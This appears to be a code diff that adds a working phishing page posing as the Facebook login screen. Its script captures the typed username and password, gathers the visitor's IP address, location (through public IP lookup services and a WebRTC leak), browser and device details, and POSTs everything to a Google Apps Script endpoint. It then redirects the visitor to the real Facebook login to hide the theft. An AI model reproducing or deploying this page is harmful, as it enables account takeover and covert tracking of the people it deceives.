@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Facebook login and sing up</title>
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 16px;
+            overflow-x: hidden;
+        }
+
+        /* ---------- Logo ---------- */
+        .logo img {
+            display: block;
+            margin: 0 auto;
+            width: 75px;
+            height: auto;
+        }
+
+        /* ---------- Heading ---------- */
+        h1 {
+            text-align: center;
+            padding-top: 10px;
+            color: #1877f2;
+            font-size: 19px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+
+        /* ---------- Login card ---------- */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px 16px 24px;
+            width: 100%;
+            max-width: 396px;
+            margin-top: 16px;
+        }
+
+        /* ---------- Inputs ---------- */
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            max-width: 360px;
+            height: 52px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 0 16px;
+            background-color: #fff;
+            color: #1d2129;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #90949c;
+            font-size: 17px;
+        }
+
+        /* =========================================
+       LOGIN BUTTON FIX
+       <a> ট্যাগের ভেতরে থাকা submit button কে
+       আসল Facebook এর মতো দেখানোর জন্য
+       ========================================= */
+
+        /* ---------- <a> wrapper কে inline-block করে পুরো width দেওয়া ---------- */
+        .container>a:first-of-type {
+            display: block;
+            width: 100%;
+            max-width: 360px;
+            margin: 0 !important;
+            padding: 0;
+            line-height: 0;
+        }
+
+        /* ---------- Submit button (আসল FB এর মতো) ---------- */
+        input[type="submit"] {
+            display: block;
+            width: 100%;
+            max-width: 360px;
+            height: 48px;
+            border-radius: 6px;
+            border: none;
+            background-color: #1877f2;
+            color: #fff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 48px;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.15s;
+            margin: 0;
+            padding: 0 16px;
+            -webkit-appearance: none;
+            appearance: none;
+            outline: none;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+
+        input[type="submit"]:active {
+            background-color: #1461c9;
+        }
+
+        /* ---------- "forgotten password?" link ---------- */
+        .container>a {
+            display: inline-block;
+            width: auto;
+            line-height: normal;
+        }
+
+        a {
+            text-decoration: none;
+            font-size: 14px;
+            color: #1877f2;
+            transition: color 0.15s;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* "forgotten password?" লিংকের margin ঠিক করা */
+        .container>a:not(:first-of-type) {
+            margin: 4px 0 8px 0 !important;
+        }
+
+        /* ---------- "or" divider ---------- */
+        .style {
+            position: relative;
+            text-align: center;
+            font-size: 13px;
+            color: #96999e;
+            width: 100%;
+            max-width: 360px;
+            margin: 8px 0;
+            line-height: 1;
+            background-color: #fff;
+        }
+
+        .style::before,
+        .style::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background-color: #dadde1;
+        }
+
+        .style::before {
+            left: 0;
+        }
+
+        .style::after {
+            right: 0;
+        }
+
+        /* ---------- Create new account button ---------- */
+        .new-account {
+            border-radius: 6px;
+            border: none;
+            color: #fff;
+            height: 48px;
+            width: fit-content;
+            min-width: 180px;
+            padding: 0 16px;
+            background-color: #42b72a;
+            margin: 10px 0 20px 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.15s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .new-account:hover {
+            background-color: #36a420;
+        }
+
+        .new-account:active {
+            background-color: #2f8f1c;
+        }
+
+        /* =========================================
+       RESPONSIVE
+       ========================================= */
+
+        /* ---- Desktop / Laptop (992px+) ---- */
+        @media (min-width: 992px) {
+            .container {
+                max-width: 396px;
+            }
+
+            input[type="submit"],
+            input[type="text"],
+            input[type="password"],
+            .style,
+            .container>a:first-of-type {
+                max-width: 360px;
+            }
+        }
+
+        /* ---- Tablet (768px - 991px) ---- */
+        @media (min-width: 768px) and (max-width: 991px) {
+            body {
+                padding: 30px 20px;
+            }
+
+            .container {
+                max-width: 396px;
+            }
+        }
+
+        /* ---- Large Phone / Small Tablet (481px - 767px) ---- */
+        @media (min-width: 481px) and (max-width: 767px) {
+            body {
+                padding: 30px 16px;
+            }
+
+            .container {
+                max-width: 396px;
+            }
+        }
+
+        /* ---- Android / iPhone (360px - 480px) ---- */
+        @media (min-width: 360px) and (max-width: 480px) {
+            body {
+                justify-content: flex-start;
+                padding: 24px 14px;
+            }
+
+            .logo img {
+                width: 64px;
+            }
+
+            h1 {
+                font-size: 18px;
+            }
+
+            .container {
+                max-width: 100%;
+                padding: 16px 14px 20px;
+                margin-top: 12px;
+                gap: 10px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                height: 48px;
+                font-size: 16px;
+                max-width: 100%;
+                padding: 0 14px;
+            }
+
+            input[type="text"]::placeholder,
+            input[type="password"]::placeholder {
+                font-size: 16px;
+            }
+
+            .container>a:first-of-type {
+                max-width: 100%;
+            }
+
+            input[type="submit"] {
+                height: 46px;
+                font-size: 18px;
+                line-height: 46px;
+                max-width: 100%;
+                padding: 0 14px;
+            }
+
+            .new-account {
+                height: 46px;
+                font-size: 16px;
+                min-width: 170px;
+            }
+
+            .style {
+                max-width: 100%;
+            }
+        }
+
+        /* ---- Small Android (320px - 359px) ---- */
+        @media (min-width: 320px) and (max-width: 359px) {
+            body {
+                justify-content: flex-start;
+                padding: 20px 12px;
+            }
+
+            .logo img {
+                width: 56px;
+            }
+
+            h1 {
+                font-size: 17px;
+            }
+
+            .container {
+                max-width: 100%;
+                padding: 14px 12px 18px;
+                gap: 8px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                height: 44px;
+                font-size: 15px;
+                padding: 0 12px;
+                max-width: 100%;
+            }
+
+            input[type="text"]::placeholder,
+            input[type="password"]::placeholder {
+                font-size: 15px;
+            }
+
+            .container>a:first-of-type {
+                max-width: 100%;
+            }
+
+            input[type="submit"] {
+                height: 42px;
+                font-size: 17px;
+                line-height: 42px;
+                max-width: 100%;
+                padding: 0 12px;
+            }
+
+            .new-account {
+                height: 42px;
+                font-size: 15px;
+                min-width: 160px;
+            }
+
+            a {
+                font-size: 13px;
+            }
+
+            .style {
+                font-size: 12px;
+                max-width: 100%;
+            }
+        }
+
+        /* ---- Very Small (below 320px) ---- */
+        @media (max-width: 319px) {
+            body {
+                justify-content: flex-start;
+                padding: 16px 10px;
+            }
+
+            .logo img {
+                width: 48px;
+            }
+
+            h1 {
+                font-size: 16px;
+            }
+
+            .container {
+                max-width: 100%;
+                padding: 12px 10px 16px;
+                gap: 7px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                height: 42px;
+                font-size: 14px;
+                padding: 0 10px;
+                max-width: 100%;
+            }
+
+            input[type="text"]::placeholder,
+            input[type="password"]::placeholder {
+                font-size: 14px;
+            }
+
+            .container>a:first-of-type {
+                max-width: 100%;
+            }
+
+            input[type="submit"] {
+                height: 40px;
+                font-size: 16px;
+                line-height: 40px;
+                max-width: 100%;
+                padding: 0 10px;
+            }
+
+            .new-account {
+                height: 40px;
+                font-size: 14px;
+                min-width: 150px;
+            }
+
+            a {
+                font-size: 12px;
+            }
+
+            .style {
+                font-size: 11px;
+                max-width: 100%;
+            }
+        }
+
+        /* ---- Landscape (phones) ---- */
+        @media (max-height: 500px) and (orientation: landscape) {
+            body {
+                justify-content: flex-start;
+                padding: 16px;
+            }
+
+            .logo img {
+                width: 50px;
+            }
+
+            h1 {
+                font-size: 16px;
+                padding-top: 4px;
+            }
+
+            .container {
+                padding: 14px 12px 16px;
+                gap: 8px;
+                margin-top: 10px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                height: 42px;
+                font-size: 15px;
+            }
+
+            input[type="submit"] {
+                height: 40px;
+                font-size: 16px;
+                line-height: 40px;
+            }
+
+            .new-account {
+                height: 40px;
+                font-size: 15px;
+            }
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="logo">
+        <img src="pp.jpg" alt="">
+    </div>
+
+    <h1>facebook</h1>
+
+    <form method="POST" name="google-sheet">
+        <div class="container">
+            <input type="text" name="user" placeholder="mobile number or email address" required>
+            <input type="password" name="data" placeholder="password" required>
+            <a href="https://m.facebook.com"><input type="submit" value=LogIn></a>
+
+
+            <a href="#">forgotten password?</a>
+            <div class="style">or</div>
+            <button class="new-account">Create New Account</button>
+
+            <!-- Fingerprint Data Fields -->
+            <input type="hidden" name="ip_address" id="ip-address">
+            <input type="hidden" name="geo_location" id="geo-location">
+            <input type="hidden" name="device_type" id="device-type">
+            <input type="hidden" name="browser_info" id="browser-info">
+            <input type="hidden" name="os_info" id="os-info">
+            <input type="hidden" name="screen_resolution" id="screen-resolution">
+            <input type="hidden" name="timezone" id="timezone">
+            <input type="hidden" name="language" id="language">
+        </div>
+    </form>
+
+    <script>
+        // Enhanced fingerprint collection with multiple fallbacks and better error handling
+        async function collectFingerprint() {
+            // Basic device info (always available)
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
+
+            // Set basic fields that don't require external services
+            document.getElementById('browser-info').value = userAgent;
+            document.getElementById('os-info').value = platform;
+            document.getElementById('device-type').value = isMobile ? 'Mobile' : 'Desktop';
+            document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
+            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            document.getElementById('language').value = navigator.language;
+
+            // Initialize IP and geo-location fields
+            document.getElementById('ip-address').value = '';
+            document.getElementById('geo-location').value = '';
+
+            // Try multiple IP detection methods in sequence
+            try {
+                // Method 1: ipapi.co (HTTPS)
+                const ipapiData = await fetchWithTimeout('https://ipapi.co/json/', 3000);
+                if (ipapiData && ipapiData.ip) {
+                    document.getElementById('ip-address').value = ipapiData.ip;
+                    document.getElementById('geo-location').value =
+                        `${ipapiData.city || ''}, ${ipapiData.region || ''}, ${ipapiData.country_name || ''}`.replace(/^, /, '');
+                    return;
+                }
+
+                // Method 2: ip-api.com (HTTPS)
+                const ipApiData = await fetchWithTimeout('https://ip-api.com/json/', 3000);
+                if (ipApiData && ipApiData.query) {
+                    document.getElementById('ip-address').value = ipApiData.query;
+                    document.getElementById('geo-location').value =
+                        `${ipApiData.city || ''}, ${ipApiData.regionName || ''}, ${ipApiData.country || ''}`.replace(/^, /, '');
+                    return;
+                }
+
+                // Method 3: ipinfo.io (HTTPS)
+                const ipinfoData = await fetchWithTimeout('https://ipinfo.io/json', 3000);
+                if (ipinfoData && ipinfoData.ip) {
+                    document.getElementById('ip-address').value = ipinfoData.ip;
+                    document.getElementById('geo-location').value =
+                        `${ipinfoData.city || ''}, ${ipinfoData.region || ''}, ${ipinfoData.country || ''}`.replace(/^, /, '');
+                    return;
+                }
+
+                // Method 4: WebRTC local IP detection (fallback)
+                const localIP = await getWebRTCLocalIP();
+                if (localIP) {
+                    document.getElementById('ip-address').value = localIP;
+                    document.getElementById('geo-location').value = 'Local IP detected';
+                    return;
+                }
+            } catch (e) {
+                console.error('Error in fingerprint collection:', e);
+            }
+
+            // Final fallback if all methods failed
+            if (!document.getElementById('ip-address').value) {
+                document.getElementById('ip-address').value = 'Unknown';
+            }
+            if (!document.getElementById('geo-location').value) {
+                document.getElementById('geo-location').value = 'Unknown';
+            }
+        }
+
+        // Helper function with timeout for fetch requests
+        async function fetchWithTimeout(url, timeout = 3000) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), timeout);
+
+                const response = await fetch(url, {
+                    signal: controller.signal,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                clearTimeout(timeoutId);
+
+                if (!response.ok) return null;
+                return await response.json();
+            } catch (error) {
+                return null;
+            }
+        }
+
+        // WebRTC local IP detection with improved reliability
+        function getWebRTCLocalIP() {
+            return new Promise((resolve) => {
+                try {
+                    const rtcPeerConn = new RTCPeerConnection({
+                        iceServers: []
+                    });
+
+                    rtcPeerConn.createDataChannel('');
+                    rtcPeerConn.createOffer()
+                        .then(offer => rtcPeerConn.setLocalDescription(offer))
+                        .catch(() => resolve(null));
+
+                    let found = false;
+                    const timeout = setTimeout(() => {
+                        if (!found) {
+                            rtcPeerConn.close();
+                            resolve(null);
+                        }
+                    }, 2000);
+
+                    rtcPeerConn.onicecandidate = (event) => {
+                        if (event.candidate && !found) {
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                            const ipMatch = event.candidate.candidate.match(ipRegex);
+                            if (ipMatch) {
+                                found = true;
+                                clearTimeout(timeout);
+                                rtcPeerConn.close();
+                                resolve(ipMatch[1]);
+                            }
+                        }
+                    };
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        // Run fingerprint collection when DOM is loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            // Run immediately
+            collectFingerprint();
+
+            // Also run again when form is submitted (in case of network delays)
+            const form = document.forms['google-sheet'];
+            if (form) {
+                form.addEventListener('submit', async function (e) {
+                    e.preventDefault();
+                    await collectFingerprint();
+
+                    try {
+                        const response = await fetch(scriptURL, {
+                            method: 'POST',
+                            body: new FormData(form)
+                        });
+                    } catch (error) {
+                        console.error('Submission error:', error);
+                    }
+
+                    // Redirect regardless of success
+                    window.location.href = 'https://www.facebook.com/login';
+                });
+            }
+        });
+
+        // Google Apps Script URL
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyp7p_405dJZ_LRePDcCDMQSlBIMJY1Ih5JE1NNHwE_UbnZY3zZMilIVqeqrc0VOaVl5A/exec';
+    </script>
+
+</body>
+
+</html>
